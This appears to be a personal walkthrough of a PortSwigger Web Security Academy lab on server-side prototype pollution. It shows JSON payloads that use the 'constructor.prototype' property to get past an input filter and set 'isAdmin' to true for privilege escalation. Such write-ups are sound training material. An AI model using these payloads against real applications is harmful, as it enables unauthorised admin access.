---
{"dg-publish":true,"permalink":"/port-swigger-web-academy/prototype-pollution/server-side-prototype-pollution/lab-7/"}
---


---
## Objective: Bypass Input Filters and Privesc

Login like usual with the given credentials::

`wiener:peter`

![Pasted image 20250402004554.png](/img/user/Images/Pasted%20image%2020250402004554.png)

Submit, inspect the request and forward to Repeater

![Pasted image 20250402004752.png](/img/user/Images/Pasted%20image%2020250402004752.png)

I'm going to  assume the normal method of polluting the prototype is filtered. Let's try bypassing this using the `constructor` property

```json
"constructor":{
	"prototype":{
		"foo":"bar"
	}
}
```

Send the request

![Pasted image 20250402010419.png](/img/user/Images/Pasted%20image%2020250402010419.png)

Great, that worked. Now just change the value of `isAdmin` to `true`

```json
"constructor":{
	"prototype":{
		"isAdmin":"true"
	}
}
```


